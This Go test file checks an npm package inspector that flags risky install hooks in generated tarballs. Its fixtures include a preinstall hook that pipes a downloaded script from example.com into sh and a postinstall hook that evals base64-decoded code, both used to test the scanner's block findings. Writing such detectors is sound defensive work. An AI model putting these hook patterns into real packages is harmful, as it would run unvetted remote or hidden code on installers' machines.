package inspect

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"strings"
	"testing"
)

// makeNPMTarball builds an in-memory npm-style tarball with one
// package.json entry containing the supplied package metadata.
func makeNPMTarball(t *testing.T, meta map[string]any) []byte {
	t.Helper()
	body, err := json.Marshal(meta)
	if err != nil {
		t.Fatal(err)
	}
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	hdr := &tar.Header{Name: "package/package.json", Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg}
	if err := tw.WriteHeader(hdr); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write(body); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	var gz bytes.Buffer
	gw := gzip.NewWriter(&gz)
	if _, err := gw.Write(raw.Bytes()); err != nil {
		t.Fatal(err)
	}
	if err := gw.Close(); err != nil {
		t.Fatal(err)
	}
	return gz.Bytes()
}

func TestNPM_CleanPackageNoFindings(t *testing.T) {
	tb := makeNPMTarball(t, map[string]any{
		"name":    "clean-pkg",
		"version": "1.0.0",
		"scripts": map[string]string{
			"test":  "jest",
			"build": "tsc",
		},
	})
	findings, err := NPMInspector{}.Inspect(tb, "clean-pkg", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for clean package, got %d: %v", len(findings), findings)
	}
}

func TestNPM_PostinstallPresenceIsWarn(t *testing.T) {
	// A "looks benign" hook with no local-dispatch and no obfuscation:
	// just prints a message. This should produce only the baseline warn
	// for hook-present.
	tb := makeNPMTarball(t, map[string]any{
		"name":    "needs-postinstall",
		"version": "1.0.0",
		"scripts": map[string]string{
			"postinstall": "echo thanks for installing",
		},
	})
	findings, err := NPMInspector{}.Inspect(tb, "needs-postinstall", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	var foundWarn bool
	for _, f := range findings {
		if f.Category == "install-hook-present" && f.Severity == SeverityWarn {
			foundWarn = true
		}
		if f.Severity == SeverityBlock {
			t.Errorf("expected only warns for plain echo postinstall, got block: %v", f)
		}
	}
	if !foundWarn {
		t.Fatal("expected install-hook-present warn finding")
	}
}

func TestNPM_HookDelegatesToLocalScriptIsBlock(t *testing.T) {
	// `node ./X.js` is the actual common worm-loader shape — the inline
	// string looks innocent but ./X.js can be the full payload. Inspector
	// flags the shape; policy decides what to allow.
	tb := makeNPMTarball(t, map[string]any{
		"name":    "delegator",
		"version": "1.0.0",
		"scripts": map[string]string{
			"postinstall": "node ./scripts/setup.js",
		},
	})
	findings, err := NPMInspector{}.Inspect(tb, "delegator", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	var blocked bool
	for _, f := range findings {
		if f.Category == "install-hook-runs-local" && f.Severity == SeverityBlock {
			blocked = true
		}
	}
	if !blocked {
		t.Fatalf("expected install-hook-runs-local block, got: %v", findings)
	}
}

func TestNPM_ObfuscatedHookIsBlock(t *testing.T) {
	// Classic worm shape: postinstall decodes base64 and execs it.
	tb := makeNPMTarball(t, map[string]any{
		"name":    "evil",
		"version": "2.0.0",
		"scripts": map[string]string{
			"postinstall": `node -e "eval(Buffer.from('Y29uc29sZS5sb2coIm93biIp', 'base64').toString())"`,
		},
	})
	findings, err := NPMInspector{}.Inspect(tb, "evil", "2.0.0")
	if err != nil {
		t.Fatal(err)
	}
	blockCount := 0
	categories := map[string]bool{}
	for _, f := range findings {
		categories[f.Category] = true
		if f.Severity == SeverityBlock {
			blockCount++
		}
	}
	if blockCount == 0 {
		t.Fatalf("expected at least one block finding, got: %v", findings)
	}
	if !categories["install-hook-obfuscated"] {
		t.Errorf("expected install-hook-obfuscated finding; got categories: %v", categories)
	}
}

func TestNPM_CurlPipeShellIsBlock(t *testing.T) {
	tb := makeNPMTarball(t, map[string]any{
		"name":    "curl-pipe-sh",
		"version": "1.0.0",
		"scripts": map[string]string{
			"preinstall": "curl https://example.com/install.sh | sh",
		},
	})
	findings, err := NPMInspector{}.Inspect(tb, "curl-pipe-sh", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	var blocked bool
	for _, f := range findings {
		if f.Severity == SeverityBlock {
			blocked = true
		}
	}
	if !blocked {
		t.Fatalf("expected block for curl|sh, got: %v", findings)
	}
}

func TestNPM_LargeHookIsBlock(t *testing.T) {
	// Inline payload smuggled into postinstall: 5 KB of script.
	tb := makeNPMTarball(t, map[string]any{
		"name":    "big-postinstall",
		"version": "1.0.0",
		"scripts": map[string]string{
			"postinstall": "console.log('" + strings.Repeat("x", 5000) + "')",
		},
	})
	findings, err := NPMInspector{}.Inspect(tb, "big-postinstall", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	var blocked bool
	for _, f := range findings {
		if f.Category == "install-hook-large" && f.Severity == SeverityBlock {
			blocked = true
		}
	}
	if !blocked {
		t.Fatalf("expected install-hook-large block, got: %v", findings)
	}
}

func TestNPM_NetworkURLInHookIsWarn(t *testing.T) {
	tb := makeNPMTarball(t, map[string]any{
		"name":    "downloads-binary",
		"version": "1.0.0",
		"scripts": map[string]string{
			"install": "node ./download.js https://github.com/foo/bar/releases/download/v1/asset.tar.gz",
		},
	})
	findings, err := NPMInspector{}.Inspect(tb, "downloads-binary", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	var sawNetWarn bool
	for _, f := range findings {
		if f.Category == "install-hook-network" && f.Severity == SeverityWarn {
			sawNetWarn = true
		}
	}
	if !sawNetWarn {
		t.Fatalf("expected install-hook-network warn, got: %v", findings)
	}
}

func TestNPM_NoPackageJSONIsError(t *testing.T) {
	// Build a tarball with some file but no package.json.
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	_ = tw.WriteHeader(&tar.Header{Name: "package/README.md", Mode: 0o644, Size: 5, Typeflag: tar.TypeReg})
	_, _ = tw.Write([]byte("hello"))
	_ = tw.Close()
	var gz bytes.Buffer
	gw := gzip.NewWriter(&gz)
	_, _ = gw.Write(raw.Bytes())
	_ = gw.Close()

	_, err := NPMInspector{}.Inspect(gz.Bytes(), "no-manifest", "1.0.0")
	if err == nil {
		t.Fatal("expected error for missing package.json")
	}
}
